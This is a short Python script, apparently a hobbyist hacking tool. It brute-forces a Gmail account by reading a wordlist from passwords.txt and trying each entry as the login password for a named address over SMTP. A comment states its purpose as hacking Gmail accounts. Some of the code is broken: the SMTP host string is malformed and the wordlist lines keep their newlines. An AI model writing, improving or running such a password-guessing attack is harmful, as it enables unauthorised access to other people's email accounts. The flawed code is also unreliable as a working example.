import smtplib

server = smtplib.SMTP_SSL("smtp@gmail.com",465)

server.ehlo()

filehandler  = open("passwords.txt","r")

for password in filehandler:

    try:
        # You Should Know The Username For Hacking gmail Accounts
        server.login("Canzmeme@gmail.com",password) 
        print("Password of the account is ",password)
        break

    except smtplib.SMTPAuthenticationError:
        print("Wrong Credentials")
        print("Wrong Password is ", password)